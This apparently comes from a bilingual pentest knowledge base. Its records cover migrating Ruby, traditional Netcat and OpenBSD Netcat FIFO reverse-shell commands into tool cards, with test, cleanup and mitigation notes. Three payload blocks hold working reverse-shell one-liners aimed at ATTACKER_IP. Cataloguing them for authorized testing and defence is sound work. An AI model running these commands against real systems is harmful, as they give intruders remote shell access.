description.zh: 测试步骤为：在一次性 Ruby 环境中分别运行 exec、fork 循环与前台循环形式，发送固定 echo 标记并检查退出和资源释放。完整保留原命令并只在一次性环境用固定标记验证。
description.en: run the exec, forked loop, and foreground loop forms separately in disposable Ruby, send a fixed echo marker, and inspect exit and resource cleanup. Preserve the original command in full and validate only with fixed markers in a disposable environment.

attackChain.payload:
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ATTACKER_IP","PORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
ruby -rsocket -e 'c=TCPSocket.new("ATTACKER_IP","PORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

title.zh: 建立目标 Tool 回归
title.en: Regress the destination tool

description.zh: 实施“迁入 ruby-reverse 并标记会话模型；生产主机限制 Ruby 解释器、出站连接和任意子进程创建”，确认工具入口、复制、去重、版本标签与导航均正确，且 Payload 树不再重复。
description.en: Apply move to ruby-reverse with session-model tags, while production hosts restrict Ruby interpreters, outbound connections, and arbitrary child-process creation and verify tool access, copying, deduplication, version tags, and navigation without payload-tree duplication.

review.rationale: Ruby TCPSocket 反连命令是纯工具命令或参考字典，应迁入 ruby-reverse，保留原始字节、来源和适用前提。

prerequisites.zh: 已确认“Ruby TCPSocket 反连命令”是纯命令/字典，目标 Tool ruby-reverse 均存在，并记录来源、版本及前提：目标提供 Ruby 与 socket 库，出站 TCP 已获授权，并且测试入口已经允许执行 Ruby 命令。
prerequisites.en: The Ruby TCPSocket Reverse Connection Commands record is command or dictionary data, destination tools ruby-reverse exist, and provenance, version, and prerequisites are recorded: the target provides Ruby and its socket library, outbound TCP is authorized, and the test entry already allows Ruby execution.

prerequisites.zh: 可在一次性主机或离线解析器逐行验证，并用受控连接与 Ruby PID、是否 fork、子进程命令和输出边界均可关联检查迁移完整性。
prerequisites.en: Every line can be checked in a disposable host or offline parser, using the controlled connection correlates with the Ruby PID, fork state, child command, and output boundary for migration completeness.

analysis.zh: 本条阳性是命令/字典被准确迁移，原字节、来源和受控连接与 Ruby PID、是否 fork、子进程命令和输出边界均可关联保留；它不确认目标漏洞。命令可运行、已有 Shell 回连、字典命中或签名相似均不能证明“TCPSocket 文件描述符交给 exec 与循环 IO.popen 两种实现的进程生命周期和输出行为”对应的初始漏洞。
analysis.en: A positive means accurate migration with original bytes, provenance, and the controlled connection correlates with the Ruby PID, fork state, child command, and output boundary; it does not confirm a target vulnerability. Runnable commands, callbacks from an existing shell, wordlist hits, or signature similarity do not prove an initial vulnerability related to process lifecycle and output behavior when a TCPSocket descriptor is handed to exec versus a looping IO.popen implementation.

opsecTips.zh: Ruby TCPSocket 反连命令停止条件：默认离线解析；执行时只用一次性自有地址和固定标记。指向公共地址、生成真实载荷、打开交互 Shell 或触碰非测试文件时立即停止。 本条重点观察“TCPSocket 文件描述符交给 exec 与循环 IO.popen 两种实现的进程生命周期和输出行为”。
opsecTips.en: Ruby TCPSocket Reverse Connection Commands stop condition: Prefer offline parsing; use disposable owned destinations and fixed markers if execution is needed. Stop on public destinations, real payload generation, interactive shells, or non-test files. The entry-specific focus is process lifecycle and output behavior when a TCPSocket descriptor is handed to exec versus a looping IO.popen implementation.

opsecTips.zh: Ruby TCPSocket 反连命令清理条件：迁移后关闭监听器，删除 FIFO、生成文件、下载脚本和测试字典副本，销毁环境并核对目标 Tool 无重复或未标记失效行。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: Ruby TCPSocket Reverse Connection Commands cleanup condition: Close listeners, remove FIFOs, generated files, downloads, and wordlist copies, destroy the environment, and verify destination tools have no duplicates or untagged invalid lines. Recheck that no triggerable state remains for this technique.

name.zh: Traditional Netcat Exec 反连命令

description.zh: 依赖传统 Netcat 的 -e 或 -c 选项将 sh、bash 或 cmd 绑定到 TCP，属于 Netcat 工具命令且不适用于默认 OpenBSD nc。
description.en: Binds sh, bash, or cmd to TCP through traditional Netcat -e or -c options; these are tool commands that do not apply to default OpenBSD nc.

overview.zh: Traditional Netcat Exec 反连命令是工具命令或参考字典，不是独立 Payload。维护目标为不同 Netcat 实现是否支持 -e 或 -c，以及 Linux 与 Windows Shell 路径的兼容边界。其适用前提为：目标安装支持 exec 选项的传统 Netcat 或 nc.exe，并允许已授权的出站连接和子进程创建。迁移质量以工具版本帮助输出、执行选项解析和受控监听连接三项证据能够对应为准，不能把工具命令可运行或字典命中自动报告为目标漏洞。
overview.en: Traditional Netcat Exec Reverse Commands is tool command or reference data rather than an independent payload. It maintains whether a Netcat implementation supports -e or -c and how Linux and Windows shell paths affect compatibility. Its prerequisites are the target has traditional Netcat or nc.exe with exec support and permits authorized outbound connections and child processes. Migration quality requires tool-version help output, exec-option parsing, and the controlled listener connection correlate; a runnable tool command or wordlist hit is not automatically a target finding.

vulnerability.zh: 该条目本身不建立漏洞。真实风险取决于目标安装支持 exec 选项的传统 Netcat 或 nc.exe，并允许已授权的出站连接和子进程创建，随后才可能用这些命令或特征审查“不同 Netcat 实现是否支持 -e 或 -c，以及 Linux 与 Windows Shell 路径的兼容边界”。必须把前置执行入口、目标环境和工具结果分开记录，避免把后渗透能力倒置成初始攻击链。
vulnerability.en: The entry does not establish a vulnerability. Risk depends on the target has traditional Netcat or nc.exe with exec support and permits authorized outbound connections and child processes, after which the commands or signatures may examine whether a Netcat implementation supports -e or -c and how Linux and Windows shell paths affect compatibility. Keep the prerequisite execution entry, target environment, and tool result separate so post-exploitation capability is not inverted into an initial chain.

exploitation.zh: 先保存 nc -h 或版本输出，再分别验证 -e 与 -c，不在 OpenBSD nc 上重复无效尝试，并使用固定 echo 命令代替交互操作。迁移时逐行保留字节、来源、平台或版本标签与副作用说明，执行验证仅限一次性环境和固定无害标记；不支持、失效或仅用于识别的行必须显式标注。
exploitation.en: capture nc help or version output, test -e and -c separately, avoid repeating unsupported forms on OpenBSD nc, and use a fixed echo command instead of interactive actions. Preserve bytes, provenance, platform or version tags, and side effects line by line; execute only in disposable environments with fixed harmless markers, and explicitly label unsupported, invalid, or signature-only lines.

mitigation.zh: 合并到 nc-reverse 并按 traditional、GNU、Windows 实现标注；主机移除不需要的 Netcat 或限制其执行与出口能力。工具卡回归需要确认目标入口可达、原命令可复制、精确重复被合并、失效项仍可追溯，并且 Payload 导航不再重复展示纯命令或字典。
mitigation.en: merge into nc-reverse with traditional, GNU, and Windows implementation tags, and remove unnecessary Netcat binaries or constrain their execution and egress. Tool-card regression must prove the destination is reachable, original commands remain copyable, exact duplicates are merged, invalid items remain traceable, and payload navigation no longer duplicates commands or dictionaries.

title.zh: 核对“Traditional Netcat Exec 反连命令”来源与角色
title.en: Verify Traditional Netcat Exec Reverse Commands provenance and role

description.zh: 确认该记录是命令或字典而非漏洞数据流，记录来源、平台、版本和前提“目标安装支持 exec 选项的传统 Netcat 或 nc.exe，并允许已授权的出站连接和子进程创建”。
description.en: Confirm the record is command or dictionary data rather than a vulnerability flow, recording provenance, platform, version, and prerequisites: the target has traditional Netcat or nc.exe with exec support and permits authorized outbound connections and child processes.

title.zh: 逐行标注“Netcat Exec 模式”适用性
title.en: Tag Netcat Exec Mode applicability line by line

description.zh: 按实现、运行时、传输或识别用途分类，记录失效语法、副作用与证据要求“工具版本帮助输出、执行选项解析和受控监听连接三项证据能够对应”。
description.en: Classify by implementation, runtime, transport, or signature use and record invalid syntax, side effects, and evidence requirements: tool-version help output, exec-option parsing, and the controlled listener connection correlate.

title.zh: 迁移“Traditional Netcat Exec 反连命令”原始命令
title.en: Migrate original Traditional Netcat Exec Reverse Commands commands

description.zh: 测试步骤为：先保存 nc -h 或版本输出，再分别验证 -e 与 -c，不在 OpenBSD nc 上重复无效尝试，并使用固定 echo 命令代替交互操作。完整保留原命令并只在一次性环境用固定标记验证。
description.en: capture nc help or version output, test -e and -c separately, avoid repeating unsupported forms on OpenBSD nc, and use a fixed echo command instead of interactive actions. Preserve the original command in full and validate only with fixed markers in a disposable environment.

attackChain.payload:
nc -e /bin/sh ATTACKER_IP PORT
nc -e /bin/bash ATTACKER_IP PORT
nc -c sh ATTACKER_IP PORT
nc -c /bin/sh ATTACKER_IP PORT
nc -c bash ATTACKER_IP PORT
nc -c /bin/bash ATTACKER_IP PORT
nc.exe -e cmd ATTACKER_IP PORT

title.zh: 建立目标 Tool 回归
title.en: Regress the destination tool

description.zh: 实施“合并到 nc-reverse 并按 traditional、GNU、Windows 实现标注；主机移除不需要的 Netcat 或限制其执行与出口能力”，确认工具入口、复制、去重、版本标签与导航均正确，且 Payload 树不再重复。
description.en: Apply merge into nc-reverse with traditional, GNU, and Windows implementation tags, and remove unnecessary Netcat binaries or constrain their execution and egress and verify tool access, copying, deduplication, version tags, and navigation without payload-tree duplication.

prerequisites.en: The Traditional Netcat Exec Reverse Commands record is command or dictionary data, destination tools nc-reverse exist, and provenance, version, and prerequisites are recorded: the target has traditional Netcat or nc.exe with exec support and permits authorized outbound connections and child processes.

prerequisites.zh: 可在一次性主机或离线解析器逐行验证，并用工具版本帮助输出、执行选项解析和受控监听连接三项证据能够对应检查迁移完整性。

analysis.en: A positive means accurate migration with original bytes, provenance, and tool-version help output, exec-option parsing, and the controlled listener connection correlate; it does not confirm a target vulnerability. Runnable commands, callbacks from an existing shell, wordlist hits, or signature similarity do not prove an initial vulnerability related to whether a Netcat implementation supports -e or -c and how Linux and Windows shell paths affect compatibility.

opsecTips.zh: Traditional Netcat Exec 反连命令停止条件：默认离线解析；执行时只用一次性自有地址和固定标记。指向公共地址、生成真实载荷、打开交互 Shell 或触碰非测试文件时立即停止。 本条重点观察“不同 Netcat 实现是否支持 -e 或 -c，以及 Linux 与 Windows Shell 路径的兼容边界”。
opsecTips.en: Traditional Netcat Exec Reverse Commands stop condition: Prefer offline parsing; use disposable owned destinations and fixed markers if execution is needed. Stop on public destinations, real payload generation, interactive shells, or non-test files. The entry-specific focus is whether a Netcat implementation supports -e or -c and how Linux and Windows shell paths affect compatibility.

opsecTips.zh: Traditional Netcat Exec 反连命令清理条件：迁移后关闭监听器，删除 FIFO、生成文件、下载脚本和测试字典副本，销毁环境并核对目标 Tool 无重复或未标记失效行。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: Traditional Netcat Exec Reverse Commands cleanup condition: Close listeners, remove FIFOs, generated files, downloads, and wordlist copies, destroy the environment, and verify destination tools have no duplicates or untagged invalid lines. Recheck that no triggerable state remains for this technique.

name.zh: OpenBSD Netcat FIFO 反连命令

description.zh: 通过 mkfifo、cat 与 OpenBSD nc 组合标准流，弥补无 -e 选项的限制，属于 Netcat 工具流程并会创建临时命名管道。
description.en: Combines mkfifo, cat, and OpenBSD nc to connect standard streams without -e; this is a Netcat tool workflow that creates a temporary named pipe.

overview.zh: OpenBSD Netcat FIFO 反连命令是工具命令或参考字典，不是独立 Payload。维护目标为命名管道、Shell 标准流和无 exec 选项的 OpenBSD nc 如何组合，以及临时文件清理要求。其适用前提为：目标提供 mkfifo、cat、sh 或 bash 与 OpenBSD nc，/tmp 可写且出站 TCP 已获测试授权。迁移质量以唯一 FIFO 路径、相关进程树、受控连接和测试结束后的清理记录完整一致为准，不能把工具命令可运行或字典命中自动报告为目标漏洞。
overview.en: OpenBSD Netcat FIFO Reverse Commands is tool command or reference data rather than an independent payload. It maintains how named pipes, shell standard streams, and OpenBSD nc without exec support combine, including temporary-file cleanup. Its prerequisites are the target provides mkfifo, cat, sh or bash, and OpenBSD nc, with writable temporary storage and authorized outbound TCP. Migration quality requires the unique FIFO path, process tree, controlled connection, and post-test cleanup record all agree; a runnable tool command or wordlist hit is not automatically a target finding.

vulnerability.zh: 该条目本身不建立漏洞。真实风险取决于目标提供 mkfifo、cat、sh 或 bash 与 OpenBSD nc，/tmp 可写且出站 TCP 已获测试授权，随后才可能用这些命令或特征审查“命名管道、Shell 标准流和无 exec 选项的 OpenBSD nc 如何组合，以及临时文件清理要求”。必须把前置执行入口、目标环境和工具结果分开记录，避免把后渗透能力倒置成初始攻击链。
vulnerability.en: The entry does not establish a vulnerability. Risk depends on the target provides mkfifo, cat, sh or bash, and OpenBSD nc, with writable temporary storage and authorized outbound TCP, after which the commands or signatures may examine how named pipes, shell standard streams, and OpenBSD nc without exec support combine, including temporary-file cleanup. Keep the prerequisite execution entry, target environment, and tool result separate so post-exploitation capability is not inverted into an initial chain.

exploitation.zh: 为每次测试使用随机临时 FIFO，逐个 Shell 路径运行并在退出后核对管道和进程均已清理。迁移时逐行保留字节、来源、平台或版本标签与副作用说明，执行验证仅限一次性环境和固定无害标记；不支持、失效或仅用于识别的行必须显式标注。
exploitation.en: use a random temporary FIFO per test, run one shell path at a time, and verify both the pipe and processes are removed after exit. Preserve bytes, provenance, platform or version tags, and side effects line by line; execute only in disposable environments with fixed harmless markers, and explicitly label unsupported, invalid, or signature-only lines.

mitigation.zh: 迁入 nc-reverse 并记录 FIFO 副作用；生产环境收紧临时目录执行、Netcat 使用与出站网络，并监控 mkfifo 后接 Shell 的进程链。工具卡回归需要确认目标入口可达、原命令可复制、精确重复被合并、失效项仍可追溯，并且 Payload 导航不再重复展示纯命令或字典。
mitigation.en: move to nc-reverse with FIFO side effects documented, and restrict temporary-directory execution, Netcat use, and egress while monitoring mkfifo-to-shell process chains. Tool-card regression must prove the destination is reachable, original commands remain copyable, exact duplicates are merged, invalid items remain traceable, and payload navigation no longer duplicates commands or dictionaries.

title.zh: 核对“OpenBSD Netcat FIFO 反连命令”来源与角色
title.en: Verify OpenBSD Netcat FIFO Reverse Commands provenance and role

description.zh: 确认该记录是命令或字典而非漏洞数据流，记录来源、平台、版本和前提“目标提供 mkfifo、cat、sh 或 bash 与 OpenBSD nc，/tmp 可写且出站 TCP 已获测试授权”。
description.en: Confirm the record is command or dictionary data rather than a vulnerability flow, recording provenance, platform, version, and prerequisites: the target provides mkfifo, cat, sh or bash, and OpenBSD nc, with writable temporary storage and authorized outbound TCP.

title.zh: 逐行标注“OpenBSD nc 与 FIFO”适用性
title.en: Tag OpenBSD nc and FIFO applicability line by line

description.zh: 按实现、运行时、传输或识别用途分类，记录失效语法、副作用与证据要求“唯一 FIFO 路径、相关进程树、受控连接和测试结束后的清理记录完整一致”。
description.en: Classify by implementation, runtime, transport, or signature use and record invalid syntax, side effects, and evidence requirements: the unique FIFO path, process tree, controlled connection, and post-test cleanup record all agree.

title.zh: 迁移“OpenBSD Netcat FIFO 反连命令”原始命令
title.en: Migrate original OpenBSD Netcat FIFO Reverse Commands commands

description.zh: 测试步骤为：为每次测试使用随机临时 FIFO，逐个 Shell 路径运行并在退出后核对管道和进程均已清理。完整保留原命令并只在一次性环境用固定标记验证。
description.en: use a random temporary FIFO per test, run one shell path at a time, and verify both the pipe and processes are removed after exit. Preserve the original command in full and validate only with fixed markers in a disposable environment.

attackChain.payload:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP PORT >/tmp/f

analysis.en: A positive means accurate migration with original bytes, provenance, and the unique FIFO path, process tree, controlled connection, and post-test cleanup record all agree; it does not confirm a target vulnerability.
